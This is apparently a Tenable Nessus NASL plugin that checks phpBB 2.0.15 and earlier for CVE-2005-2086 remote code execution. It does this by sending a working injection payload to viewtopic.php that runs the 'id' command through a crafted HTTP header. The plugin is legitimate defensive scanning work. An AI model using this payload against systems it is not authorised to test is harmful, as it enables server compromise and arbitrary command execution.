#
# (C) Tenable Network Security
#


  desc = "
Synopsis :

The remote web server contains a PHP script that is affected by a code
injection vulnerability. 

Description :

The remote host is running a version of phpBB that allows attackers to
inject arbitrary PHP code to the 'viewtopic.php' script to be executed
within the context of the web server userid. 

See also : 

http://www.securityfocus.com/archive/1/403631/30/0/threaded

Solution : 

Upgrade to phpBB version 2.0.16 or later.

Risk factor : 

High / CVSS Base Score : 7
(AV:R/AC:L/Au:NR/C:P/A:P/I:P/B:N)";
 

if (description) {
  script_id(18589);
  script_version("$Revision: 1.8 $");

  script_cve_id("CVE-2005-2086");
  script_bugtraq_id(14086);

  name["english"] = "phpBB <= 2.0.15 Remote Code Execution Vulnerability";
  script_name(english:name["english"]);
 
  script_description(english:desc);

  summary["english"] = "Checks for remote code execution vulnerability in phpBB <= 2.0.15";
  script_summary(english:summary["english"]);
 
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2005-2006 Tenable Network Security");

  script_dependencies("phpbb_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Test an install.
install = get_kb_item(string("www/", port, "/phpBB"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches)) {
  ver = matches[1];
  dir = matches[2];

  # First we need a forum number.
  req = http_get(item:string(dir, "/index.php"), port:port);
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  pat = '<a href="viewforum\\.php\\?f=([0-9]+)';
  matches = egrep(pattern:pat, string:res, icase:TRUE);
  if (matches) {
    foreach match (split(matches)) {
      match = chomp(match);
      forum = eregmatch(pattern:pat, string:match);
      if (!isnull(forum)) {
        forum = forum[1];
        break;
      }
    }
  }

  if (isnull(forum)) {
    if (log_verbosity > 1) debug_print("couldn't find a forum to use!", level:0);
  }
  else {
    # Next we need a topic number.
    req = http_get(
      item:string(
        dir, "/viewforum.php?",
        "f=", forum
      ), 
      port:port
    );
    res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
    if (res == NULL) exit(0);

    pat = '<a href="viewtopic\\.php\\?t=([0-9]+)';
    matches = egrep(pattern:pat, string:res, icase:TRUE);
    if (matches) {
      foreach match (split(matches)) {
        match = chomp(match);
        topic = eregmatch(pattern:pat, string:match);
        if (!isnull(topic)) {
          topic = topic[1];
          break;
        }
      }
    }

    if (isnull(topic)) {
      if (log_verbosity > 1) debug_print("couldn't find a topic to use!", level:0);
    }
    else {
      # Finally, we can try to exploit the flaw.
      # exploit method comes from public exploit released by dab@digitalsec.net
      req =string(
        "GET ", dir, "/viewtopic.php?",
          "t=", topic, "&",
          "highlight='.system(getenv(HTTP_PHP)).' HTTP/1.1\r\n",
          "Host: ", get_host_name(), "\r\n",
          "PHP: id\r\n",
          "\r\n"
      );
      res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
      if (res == NULL) exit(0);

      line = egrep(pattern:"uid=[0-9]+.*gid=[0-9]+.*", string:res);
      if (line)
      {
        report = string(
          desc,
          "\n\n",
          "Plugin output :\n",
          "\n",
          "Nessus was able to execute the command 'id' on the remote host,\n",
          "which produced the following output :\n",
          "\n",
          line
        );
        security_hole(port:port, data:report);
        exit(0);
      }
    }
  }
}
